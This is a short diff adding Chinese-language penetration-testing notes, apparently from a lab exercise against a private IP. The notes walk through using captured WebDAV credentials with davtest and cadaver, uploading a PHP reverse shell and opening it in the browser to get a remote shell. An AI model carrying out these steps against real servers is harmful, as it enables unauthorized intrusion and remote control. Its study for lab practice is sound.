@@ -1,0 +1,9 @@
+如果获得了Dav的登录凭证(用户名与密码)
+使用dactest查看有哪些执行文件
+davtest -url http://192.168.52.130/webdav -auth 用户名:密码
+使用客户端进行登录
+cadaver http://192.168.52.130/webdav
+如果可以执行php文件那么可以创建一个反弹shell
+在登录上去的客户端
+put /home/kali/send_hack_file/php_reverse_shell/sh.php 
+在浏览器的http://192.168.52.130/webdav中点击文件
